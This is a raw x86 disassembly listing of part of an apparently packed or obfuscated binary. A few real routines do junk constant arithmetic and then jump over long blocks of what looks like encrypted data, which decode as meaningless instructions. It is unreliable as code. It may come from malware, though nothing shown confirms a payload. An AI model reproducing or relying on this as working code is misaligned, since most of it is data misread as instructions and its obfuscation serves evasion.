  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225cc
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	arpl   dx,bp
  4122a3:	fstp   TBYTE PTR [esi-0x2]
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	xchg   esi,eax
  4122ae:	xchg   edx,eax
  4122af:	sub    ecx,edi
  4122b1:	into   
  4122b2:	ja     0x4122ba
  4122b4:	cli    
  4122b5:	xchg   edx,eax
  4122b6:	or     BYTE PTR [ebx-0x1b883897],dh
  4122bc:	dec    esp
  4122bd:	and    al,0x65
  4122bf:	dec    ebx
  4122c0:	icebp  
  4122c1:	add    al,0xa8
  4122c3:	mov    ch,0xcf
  4122c5:	adc    DWORD PTR [edi],0x34c24b9
  4122cb:	add    al,0x83
  4122cd:	sub    eax,0x6cd1d53d
  4122d2:	lds    ecx,FWORD PTR [ebx-0x5e]
  4122d5:	or     al,0xa8
  4122d7:	push   eax
  4122d8:	pop    ebx
  4122d9:	ins    BYTE PTR es:[edi],dx
  4122da:	push   ss
  4122db:	or     eax,DWORD PTR [esi-0x165be558]
  4122e1:	push   ebp
  4122e2:	sbb    BYTE PTR [esi+eax*1-0xc],0xf3
  4122e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122e8:	sbb    eax,0xe3c09701
  4122ed:	cmp    BYTE PTR [edx-0x58ae5ad7],0x67
  4122f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122f5:	xor    eax,0xa7cfd20f
  4122fa:	mov    dh,0xd7
  4122fc:	or     eax,0x68e30cc8
  412301:	mov    edi,0x6f9cb082
  412306:	imul   eax,DWORD PTR [eax-0x4f],0xffffffd2
  41230a:	mov    ds,WORD PTR [ecx+0x6fc550b3]
  412310:	sar    BYTE PTR [eax-0x39],1
  412313:	sbb    BYTE PTR [edx],al
  412315:	inc    ebx
  412316:	pop    ecx
  412317:	(bad)  
  412319:	adc    DWORD PTR [edx+0x55f88c7a],eax
  41231f:	mov    WORD PTR [esi-0x7189f580],cs
  412325:	ret    0x774c
  412328:	out    dx,al
  412329:	push   esi
  41232a:	lods   eax,DWORD PTR ds:[esi]
  41232b:	aam    0x73
  41232d:	mov    eax,ds:0x109e1cdd
  412332:	ss inc esp
  412334:	sub    BYTE PTR [edx+0x33777e36],0xe4
  41233b:	push   ecx
  41233c:	arpl   WORD PTR [edi+0x6c4c5929],bx
  412342:	scas   eax,DWORD PTR es:[edi]
  412343:	jo     0x4123b3
  412345:	jns    0x4122cc
  412347:	mov    esi,0x6ef59e25
  41234c:	cmc    
  41234d:	cli    
  41234e:	pop    edi
  41234f:	cs ja  0x4122e8
  412352:	out    dx,al
  412353:	mov    eax,0x789a37ab
  412358:	pop    ecx
  412359:	inc    ebx
  41235a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41235b:	xor    al,0x9a
  41235d:	dec    DWORD PTR [ebx+0x71]
  412360:	enter  0xece2,0x4c
  412364:	pusha  
  412365:	sti    
  412366:	(bad)  
  412367:	and    eax,0xe3e81995
  41236c:	test   eax,0xd047bb15
  412371:	icebp  
  412372:	fs add eax,0x4cd4dcdd
  412378:	mov    dh,0xa
  41237a:	pop    es
  41237b:	call   0x4d43d707
  412380:	push   0xffffffac
  412382:	out    dx,al
  412383:	int3   
  412384:	cdq    
  412385:	fs push edi
  412387:	jo     0x4123cb
  412389:	and    DWORD PTR [bp+si-0x78],0x25
  41238e:	add    esi,DWORD PTR [edx+0x31]
  412391:	fs shl edi,0xf6
  412395:	mov    eax,ds:0x42687e65
  41239a:	adc    BYTE PTR [ebx],ch
  41239c:	dec    ecx
  41239d:	jbe    0x412377
  41239f:	jg     0x41234d
  4123a1:	ret    0xc13e
  4123a4:	pop    ds
  4123a5:	out    0xbb,al
  4123a7:	sar    BYTE PTR [eax+0x4ca1c79a],cl
  4123ad:	mov    ah,0xb5
  4123af:	popa   
  4123b0:	fistp  WORD PTR [edi+0x31]
  4123b3:	dec    edx
  4123b4:	in     al,0xbe
  4123b6:	mov    ebx,0xb1db5478
  4123bb:	adc    DWORD PTR [ecx],ebp
  4123bd:	fidiv  WORD PTR [ebx]
  4123bf:	fstp   QWORD PTR [eax-0x5c]
  4123c2:	outs   dx,BYTE PTR ds:[esi]
  4123c3:	or     eax,0xedad3db0
  4123c8:	push   eax
  4123ca:	stos   DWORD PTR es:[edi],eax
  4123cb:	pop    ds
  4123cc:	mov    ebp,0x7e4e3268
  4123d1:	inc    esi
  4123d2:	mov    edi,0xe777ef37
  4123d7:	lahf   
  4123d8:	repz aas 
  4123da:	rol    esi,0xee
  4123dd:	rcr    BYTE PTR [edx-0x4e],1
  4123e0:	xchg   di,ax
  4123e2:	cs aam 0xa8
  4123e5:	repnz push edx
  4123e7:	ret    0xd5d9
  4123ea:	test   al,0xa8
  4123ec:	xor    BYTE PTR [ecx+0x46d5556f],0xff
  4123f3:	adc    ebp,esp
  4123f5:	fst    DWORD PTR [ebp+0x79]
  4123f8:	mov    eax,0x8c64e9d2
  4123fd:	out    0xf7,al
  4123ff:	neg    BYTE PTR [edi]
  412401:	test   eax,0x5379f8fa
  412406:	jecxz  0x4123b6
  412408:	repnz add eax,0xf75c50aa
  41240e:	out    dx,eax
  41240f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412410:	mov    WORD PTR [edx],ds
  412412:	mov    edx,0x4e17abc
  412417:	fisttp WORD PTR [esi+0x2]
  41241a:	pop    eax
  41241b:	xchg   ebp,eax
  41241c:	lock retf 
  41241e:	push   ecx
  41241f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412420:	sub    esi,DWORD PTR [ebx]
  412422:	repnz rol BYTE PTR [esi],1
  412425:	jmp    0xaa13:0xac9886da
  41242c:	loop   0x412461
  41242e:	xchg   edi,ebp
  412430:	js     0x41249d
  412432:	aaa    
  412433:	clc    
  412434:	ins    DWORD PTR es:[edi],dx
  412435:	jbe    0x4124a3
  412437:	cmp    eax,0xd5440563
  41243c:	je     0x412493
  41243e:	icebp  
  41243f:	add    BYTE PTR [eax-0x6f007124],ah
  412445:	sub    eax,0xf26478df
  41244a:	ror    DWORD PTR [eax-0x38186f8b],cl
  412450:	sbb    al,0x64
  412452:	or     al,0x17
  412454:	scas   eax,DWORD PTR es:[edi]
  412455:	pushf  
  412456:	repz sbb al,dh
  412459:	sub    BYTE PTR [ebx+ecx*2+0x16],ah
  41245d:	(bad)  
  41245e:	adc    BYTE PTR [ebx+0x2b600f7],dh
  412464:	mov    esi,0xf8068ce2
  412469:	adc    dl,BYTE PTR [esi]
  41246b:	adc    eax,0xaee52817
  412470:	lock cmp eax,0x4c049e17
  412476:	sub    eax,0xa0551c11
  41247b:	and    BYTE PTR [ebx],al
  41247d:	adc    BYTE PTR [ecx],0x11
  412480:	push   ds
  412481:	push   edx
  412482:	and    eax,0x982c346e
  412487:	inc    edx
  412488:	mov    cl,0xb1
  41248a:	(bad)  
  41248c:	je     0x412495
  41248e:	clc    
  41248f:	outs   dx,BYTE PTR ds:[esi]
  412490:	jl     0x4124a5
  412492:	cmc    
  412493:	call   0x2960c2ed
  412498:	adc    al,0x74
  41249a:	dec    ebx
  41249b:	pop    edx
  41249c:	aad    0x88
  41249e:	out    0xe0,eax
  4124a0:	shr    BYTE PTR [esp+eax*4],1
  4124a3:	ror    BYTE PTR [ebx+edx*2+0x20573b9e],cl
  4124aa:	or     DWORD PTR [ebx+0x59],ebp
  4124ad:	mov    esp,0x9cf1c3cd
  4124b2:	test   BYTE PTR [ecx-0x5200d92c],0xa5
  4124b9:	imul   edx,DWORD PTR [esi-0x2dd407d0],0xffffffdb
  4124c0:	test   DWORD PTR [esi-0x2],edi
  4124c3:	sub    eax,0x3be6526f
  4124c8:	popf   
  4124c9:	sub    BYTE PTR [eax-0x3372d083],cl
  4124cf:	xor    al,0x27
  4124d1:	test   eax,0x2c4a5979
  4124d6:	bswap  ecx
  4124d8:	aaa    
  4124d9:	inc    ecx
  4124da:	(bad)  
  4124db:	out    0xd0,al
  4124dd:	jle    0x41255b
  4124df:	(bad)  
  4124e0:	and    eax,0xcead94c2
  4124e5:	push   ds
  4124e6:	ins    BYTE PTR es:[edi],dx
  4124e7:	fnstcw WORD PTR [edi+0x205f3e3c]
  4124ed:	test   DWORD PTR [edx-0x5b],0x3f9815d6
  4124f4:	ret    0x8d2e
  4124f7:	fisttp WORD PTR [eax+eax*1]
  4124fa:	call   0xc7f7ef5
  4124ff:	mov    dh,al
  412501:	(bad)  
  412502:	imul   eax,DWORD PTR [ecx+eax*4-0xeec2ffd],0xffffff81
  41250a:	ret    0x2313
  41250d:	add    BYTE PTR [eax],al
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x422049
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x4124d6
  412538:	push   edx
  412539:	cmp    DWORD PTR [edx+0x57],ebp
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	addr16 clc 
  412545:	mov    fs,WORD PTR [esi]
  412547:	aam    0x4d
  412549:	clc    
  41254a:	pop    ss
  41254b:	sub    eax,0x69386c4f
  412550:	add    BYTE PTR [edx+0x26],dl
  412553:	sub    esp,esp
  412555:	out    0x27,al
  412557:	rol    esp,0x77
  41255a:	adc    al,0xcd
  41255c:	cmp    edx,DWORD PTR [ebx]
  41255e:	add    DWORD PTR [ebp-0x252f260e],edi
  412564:	mov    bh,0x92
  412566:	or     DWORD PTR [ebp+0x64a54567],ecx
  41256c:	setbe  BYTE PTR [esi+ecx*4+0x4475faf7]
  412574:	in     eax,dx
  412575:	cmp    al,0x45
  412577:	(bad)  
  412578:	mov    ah,0xcc
  41257a:	pop    edx
  41257b:	mov    edx,DWORD PTR ds:0xa75bc67a
  412581:	imul   edx,DWORD PTR [edx+0x7b519ef3],0x824ec0b1
  41258b:	or     eax,0xba6b3304
  412590:	xchg   DWORD PTR [ebx+0x69c805b7],esp
  412596:	push   esp
  412597:	scas   al,BYTE PTR es:[edi]
  412598:	and    ecx,esp
  41259a:	push   esp
  41259b:	mov    bh,0xe0
  41259d:	ret    0xcec
  4125a0:	xlat   BYTE PTR ds:[ebx]
  4125a1:	add    dh,0xfc
  4125a4:	dec    eax
  4125a5:	sbb    ch,BYTE PTR [ebp-0x3a88e2ef]
  4125ab:	(bad)  
  4125ac:	retf   
  4125ad:	test   al,0x17
  4125af:	aam    0x2c
  4125b1:	test   al,0x85
  4125b3:	push   cs
  4125b4:	mov    ds:0xac33e18c,eax
  4125b9:	retf   0x7abe
  4125bc:	aas    
  4125bd:	ss call 0x47c3dff5
  4125c3:	leave  
  4125c4:	jmp    0xe8a2:0x625978c2
  4125cb:	or     ebp,ebx
  4125cd:	mov    ebp,0x553378cc
  4125d2:	cld    
  4125d3:	add    BYTE PTR [eax-0x40cc4fc4],ch
  4125d9:	or     eax,0x332d0d9b
  4125de:	mov    ch,0x29
  4125e0:	mov    ch,0x2e
  4125e2:	es ret 
  4125e4:	xchg   ecx,eax
  4125e5:	scas   al,BYTE PTR es:[edi]
  4125e6:	push   0x19488f43
  4125eb:	call   0xdd3b:0xcb072f8d
  4125f2:	test   al,0x91
  4125f4:	rol    DWORD PTR [eax],1
  4125f6:	adc    ebp,eax
  4125f8:	xor    eax,0x53db0fb3
  4125fd:	jl     0x4125b6
  4125ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412600:	push   esp
  412601:	repz push edi
  412603:	rol    DWORD PTR [eax+0x2944942f],1
  412609:	das    
  41260a:	jg     0x41265b
  41260c:	jae    0x4125cc
  41260e:	imul   esi,DWORD PTR [esi-0x4f9734e8],0x2107aa4f
  412618:	add    ebp,edx
  41261a:	jae    0x4125cf
  41261c:	fstp   TBYTE PTR [ecx]
  41261e:	lahf   
  41261f:	and    BYTE PTR [ebp+0x34f879e0],0x41
  412626:	cmp    edi,eax
  412628:	inc    edi
  412629:	cwde   
  41262a:	popa   
  41262b:	outs   dx,BYTE PTR ds:[esi]
  41262c:	and    BYTE PTR [eax+ebp*4-0x778729db],dh
  412633:	sbb    bl,BYTE PTR [edi-0x68985a6]
  412639:	push   ds
  41263a:	loop   0x412613
  41263c:	add    eax,0x9bb326e0
  412641:	push   ebx
  412642:	stos   BYTE PTR es:[edi],al
  412643:	mov    BYTE PTR [ecx+0x5b76803f],0x4e
  41264a:	xlat   BYTE PTR ss:[ebx]
  41264c:	xor    al,0x12
  41264e:	out    dx,al
  41264f:	mov    eax,ds:0x818b2225
  412654:	call   0x6e9e:0x4cc27997
  41265b:	or     DWORD PTR [ebp+0x6ee98ebf],ebp
  412661:	inc    ebx
  412662:	cmp    al,0xf7
  412664:	or     bl,BYTE PTR ds:0x144998b9
  41266a:	cwde   
  41266b:	les    edi,FWORD PTR [esi+0xbdb631e]
  412671:	sub    eax,DWORD PTR [ecx]
  412673:	and    al,0x14
  412676:	cmp    eax,0x332ffff0
  41267b:	xchg   ebx,eax
  41267c:	pop    esp
  41267d:	push   0x1169c1d2
  412682:	adc    al,0x2b
  412684:	lds    edi,FWORD PTR [ebx+0x772a89db]
  41268a:	(bad)  
  41268b:	repnz test DWORD PTR [edi],0x60f13fb9
  412692:	or     eax,0xdcc99def
  412697:	lods   al,BYTE PTR ds:[esi]
  412698:	sub    al,0x76
  41269a:	fwait
  41269b:	outs   dx,BYTE PTR ds:[esi]
  41269c:	cmp    DWORD PTR [ecx+0x72],eax
  41269f:	push   0xffffffe1
  4126a1:	lss    ecx,FWORD PTR [esi+0x5dc45500]
  4126a8:	pop    es
  4126a9:	mov    ebp,0x5db9ac63
  4126ae:	sbb    ch,BYTE PTR [eax]
  4126b0:	mov    BYTE PTR [ebx-0x6f2a5c98],ch
  4126b6:	sub    al,0x3e
  4126b8:	pop    ss
  4126b9:	fwait
  4126ba:	cmp    bl,dl
  4126bc:	push   ebp
  4126bd:	cwde   
  4126be:	ror    BYTE PTR [eax-0x4d],1
  4126c1:	cwde   
  4126c2:	outs   dx,BYTE PTR ds:[esi]
  4126c3:	lods   eax,DWORD PTR ds:[esi]
  4126c4:	or     ebp,ebx
  4126c6:	xchg   ecx,eax
  4126c7:	pop    edx
  4126c8:	pop    ecx
  4126c9:	ins    DWORD PTR es:[edi],dx
  4126ca:	push   ebx
  4126cb:	mov    eax,0xb047d74a
  4126d0:	push   ss
  4126d1:	pop    ecx
  4126d2:	push   ss
  4126d3:	and    eax,0x8554e8f6
  4126d8:	fist   WORD PTR [eax-0x39]
  4126db:	lods   al,BYTE PTR ds:[esi]
  4126dc:	rol    BYTE PTR [ecx+0x12051012],0xef
  4126e3:	cmp    DWORD PTR [ecx-0x5304c9d7],0xfffffff0
  4126ea:	push   0xffffffcb
  4126ec:	or     dl,cl
  4126ee:	fsub   DWORD PTR [eax+0x70]
  4126f1:	ins    BYTE PTR es:[edi],dx
  4126f2:	sbb    eax,0x157f69d4
  4126f7:	enter  0x97e1,0xa7
  4126fb:	call   0x4d36921e
  412700:	pop    es
  412701:	popa   
  412702:	call   DWORD PTR [eax]
  412704:	inc    edx
  412705:	icebp  
  412706:	test   al,0xf1
  412708:	and    BYTE PTR [esi],0xa2
  41270b:	xchg   esi,eax
  41270c:	out    dx,al
  41270d:	(bad)  
  41270e:	adc    al,0x52
  412710:	push   ecx
  412711:	xor    al,0x1
  412713:	jle    0x4126d7
  412715:	ins    DWORD PTR es:[edi],dx
  412716:	sub    al,0x8d
  412718:	stc    
  412719:	inc    esp
  41271a:	fs dec edi
  41271c:	push   ss
  41271d:	inc    ebp
  41271e:	pushf  
  41271f:	leave  
  412720:	xchg   cl,bh
  412722:	inc    ebp
  412723:	mov    esi,0xbcdd2528
  412728:	mov    BYTE PTR [ebx+eax*8-0x3f533bcf],cl
  41272f:	sbb    BYTE PTR [edx+ebx*1-0x16d04e79],al
  412736:	mov    bh,0x49
  412738:	les    edx,FWORD PTR [edi-0x67]
  41273b:	clc    
  41273c:	dec    ebp
  41273d:	cmp    esi,edx
  41273f:	cmp    DWORD PTR [ecx+0x3d],esi
  412742:	pusha  
  412743:	xor    al,0x5d
  412745:	dec    esi
  412746:	pop    ebx
  412747:	and    al,0x4d
  412749:	jne    0x4127c4
  41274b:	xchg   esi,eax
  41274c:	fst    QWORD PTR [edx+0xe]
  41274f:	sub    dl,dh
  412751:	jmp    0x4127af
  412753:	xchg   edi,eax
  412754:	std    
  412755:	adc    DWORD PTR [esi+0x73ff5d5a],eax
  41275b:	stc    
  41275c:	(bad)  
  41275d:	cld    
  41275e:	pushf  
  41275f:	adc    DWORD PTR [edx+0x21],edx
  412762:	inc    edi
  412763:	(bad)  
  412764:	xchg   DWORD PTR [ebx+eiz*4],esp
  412767:	jge    0x41279d
  412769:	xchg   ebx,esp
  41276b:	adc    al,0xe8
  41276d:	in     al,dx
  41276e:	mov    dl,0xbc
  412770:	push   eax
  412771:	push   0x84629a5b
  412776:	dec    ecx
  412777:	bound  ecx,QWORD PTR [edx-0x3f]
  41277a:	test   BYTE PTR [ebp+0x11f93b28],ah
  412780:	and    DWORD PTR [edi],0xc017b961
  412786:	jmp    0xf0c0:0x36dc8f8c
  41278d:	clc    
  41278e:	ja     0x412734
  412790:	popf   
  412791:	xchg   ebx,eax
  412792:	and    DWORD PTR [ecx-0x7b],esp
  412795:	xchg   ebx,eax
  412797:	outs   dx,BYTE PTR ds:[esi]
  412798:	and    DWORD PTR [edi-0x21],0x1b
  41279c:	ret    0x158b
  41279f:	int3   
  4127a0:	and    eax,0xf6330042
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225cc
  4127d5:	mov    ds:0x4225d4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0x7e51ef77
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [esi-0x7e],al
  4128b4:	icebp  
  4128b5:	test   DWORD PTR [edx-0x11],0xcf381175
  4128bc:	mov    edx,0x26a35260
  4128c1:	in     al,dx
  4128c2:	or     DWORD PTR [eax+0x41],0x55
  4128c6:	cmp    eax,0x49400899
  4128cb:	sub    esi,ebp
  4128cd:	data16 sub bh,BYTE PTR [eax+0x6e1430e3]
  4128d4:	add    BYTE PTR [eax],ch
  4128d6:	or     al,0x91
  4128d8:	sub    DWORD PTR [esi-0x646a4aad],edi
  4128de:	and    DWORD PTR [ecx-0x574d4624],esi
  4128e4:	pusha  
  4128e5:	test   DWORD PTR [edi],esi
  4128e7:	and    al,0x9b
  4128e9:	inc    ebp
  4128ea:	imul   esi,DWORD PTR [ebp-0x79],0x36
  4128ee:	mov    ?,ebp
  4128f0:	in     al,0x65
  4128f2:	add    eax,0x1e43c13d
  4128f7:	push   ss
  4128f8:	xchg   ecx,eax
  4128f9:	ds inc ebp
  4128fb:	test   BYTE PTR [ebp-0x46],bl
  4128fe:	mov    cl,0xce
  412900:	inc    ebp
  412901:	sbb    al,0xcf
  412903:	adc    DWORD PTR ds:[edx-0xb3b80e1],edx
  41290a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41290b:	push   cs
  41290c:	mov    cl,0x70
  41290e:	in     eax,0x54
  412910:	sar    edx,cl
  412912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412913:	jnp    0x41291a
  412915:	sub    eax,0xa5be55c3
  41291a:	pusha  
  41291b:	jg     0x4128c8
  41291d:	pop    ebp
  41291e:	jle    0x4128e5
  412920:	or     eax,0x8657c9d6
  412925:	push   0x868f4713
  41292a:	pop    ebp
  41292b:	xor    BYTE PTR [edi],dl
  41292d:	adc    DWORD PTR [ecx],eax
  41292f:	jge    0x4128ce
  412931:	xor    BYTE PTR ds:0x7e26e3be,al
  412937:	lds    ebx,FWORD PTR [eax+0x118b5d14]
  41293d:	pop    edi
  41293e:	(bad)  
  41293f:	xchg   ecx,eax
  412940:	fisub  DWORD PTR [edi]
  412942:	xor    BYTE PTR [ecx+0x23bb1d2e],bh
  412948:	fnstcw WORD PTR [ebx]
  41294a:	pusha  
  41294b:	loop   0x41294f
  41294d:	in     eax,0xd8
  41294f:	addr16 push esi
  412951:	ret    0x3b74
  412954:	es push edi
  412956:	addr16 dec esp
  412958:	hlt    
  412959:	in     al,dx
  41295a:	test   DWORD PTR [eax],edi
  41295c:	adc    al,0xde
  41295e:	push   ecx
  41295f:	xchg   esi,eax
  412960:	jge    0x412924
  412962:	ins    BYTE PTR es:[edi],dx
  412963:	pop    esp
  412964:	mov    DWORD PTR [eax+eax*1],ebx
  412967:	(bad)  
  412968:	sbb    BYTE PTR [ecx-0xf43c218],dh
  41296e:	cmc    
  41296f:	jbe    0x41299c
  412971:	shl    DWORD PTR [ecx-0x47e25f49],0x7
  412978:	imul   DWORD PTR [eax+0x518dde80]
  41297e:	inc    eax
  41297f:	pushf  
  412980:	pushf  
  412981:	stos   BYTE PTR es:[edi],al
  412982:	or     al,0x47
  412984:	and    eax,0x5daa47f
  412989:	xchg   edi,eax
  41298a:	in     eax,dx
  41298b:	ret    0xe5a5
  41298e:	mov    dl,bh
  412990:	arpl   WORD PTR [edi-0x1fab3016],di
  412996:	mov    esi,0x7eadef5
  41299b:	xchg   edx,eax
  41299c:	hlt    
  41299d:	push   0xd7fe3300
  4129a2:	pusha  
  4129a3:	mov    ds:0x9eca446c,al
  4129a8:	xchg   DWORD PTR [eax-0x6d],edi
  4129ab:	sbb    eax,0x1cf03078
  4129b0:	sbb    al,0xac
  4129b2:	add    esp,DWORD PTR [esi+0x49]
  4129b5:	test   eax,0xd2d6a872
  4129ba:	xchg   BYTE PTR [edi-0x78153182],dh
  4129c0:	cmp    dl,BYTE PTR [ecx+0x1b]
  4129c3:	outs   dx,DWORD PTR ds:[esi]
  4129c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c5:	arpl   WORD PTR [edi],ax
  4129c7:	inc    DWORD PTR [ecx+0x23a2e15d]
  4129cd:	scas   al,BYTE PTR es:[edi]
  4129ce:	nop
  4129cf:	lock push 0x164c3ec2
  4129d5:	(bad)  
  4129d6:	fdivp  st(3),st
  4129d8:	mov    ds:0x8f703ef2,eax
  4129dd:	fwait
  4129de:	jb     0x412a0c
  4129e0:	sbb    BYTE PTR [eax],ah
  4129e2:	mov    esp,0x1bbc8564
  4129e7:	(bad)  
  4129e8:	std    
  4129e9:	in     al,dx
  4129ea:	adc    eax,0x8363b3cb
  4129ef:	cmc    
  4129f0:	push   ss
  4129f1:	retf   
  4129f2:	aaa    
  4129f3:	lahf   
  4129f4:	mov    esi,ebx
  4129f6:	inc    esp
  4129f7:	in     al,0x6e
  4129f9:	mov    WORD PTR ss:[eax],es
  4129fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129fd:	xchg   ecx,eax
  4129fe:	dec    ebp
  4129ff:	cmp    eax,esp
  412a01:	dec    eax
  412a02:	jmp    0xa61f:0x8441b3e
  412a09:	ror    BYTE PTR [ebp+0xfee43f],cl
  412a0f:	jmp    0x5b2969db
  412a14:	loope  0x412a2c
  412a16:	or     DWORD PTR [esi],0x1b
  412a19:	out    0xb6,al
  412a1b:	loop   0x412a91
  412a1d:	rcr    DWORD PTR [ebx+0x7d56a215],1
  412a23:	sub    ebp,esp
  412a25:	jmp    0x4129d2
  412a27:	cmp    BYTE PTR [ecx+0x4247353c],dl
  412a2d:	adc    ah,BYTE PTR [edx]
  412a2f:	vmread edx,edi
  412a32:	mov    edx,0x777f2905
  412a37:	test   eax,0x6f58c894
  412a3c:	push   edi
  412a3d:	xchg   esi,eax
  412a3e:	in     eax,dx
  412a3f:	and    edx,DWORD PTR [esp+eax*2]
  412a42:	cmp    DWORD PTR [eax+edi*2-0x4d],eax
  412a46:	jbe    0x412ab0
  412a48:	cmp    esi,ecx
  412a4a:	and    eax,0x24f32af6
  412a4f:	fst    QWORD PTR [ebp-0x7f3822ae]
  412a55:	mov    eax,esp
  412a57:	out    0x33,eax
  412a59:	rol    BYTE PTR [ecx],cl
  412a5b:	rol    esp,1
  412a5d:	ror    BYTE PTR [esi+0x77],cl
  412a60:	jbe    0x412ab7
  412a62:	inc    edx
  412a63:	stos   BYTE PTR es:[edi],al
  412a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a65:	cmp    al,0x88
  412a67:	pcmpgtb mm7,QWORD PTR [edx+0x7c]
  412a6b:	js     0x412a34
  412a6d:	or     al,0x92
  412a6f:	cwde   
  412a70:	mov    ebx,0x79dc34b4
  412a75:	mov    edi,0x1c8df939
  412a7a:	aas    
  412a7b:	(bad)  
  412a7c:	(bad)  
  412a7e:	outs   dx,DWORD PTR ds:[esi]
  412a7f:	or     dh,dh
  412a81:	push   ebp
  412a82:	fadd   st,st(1)
  412a84:	sub    al,0x9e
  412a86:	call   0xe8047149
  412a8b:	push   ss
  412a8c:	icebp  
  412a8d:	dec    edi
  412a8e:	jb     0x412a1f
  412a90:	jbe    0x412a72
  412a92:	repz adc ebp,DWORD PTR [ebx]
  412a95:	push   cs
  412a96:	push   cs
  412a97:	repz adc BYTE PTR [edi-0x6c0e233b],bl
  412a9e:	ret    
  412a9f:	or     edi,DWORD PTR [esi+0x51]
  412aa2:	sbb    al,0x1f
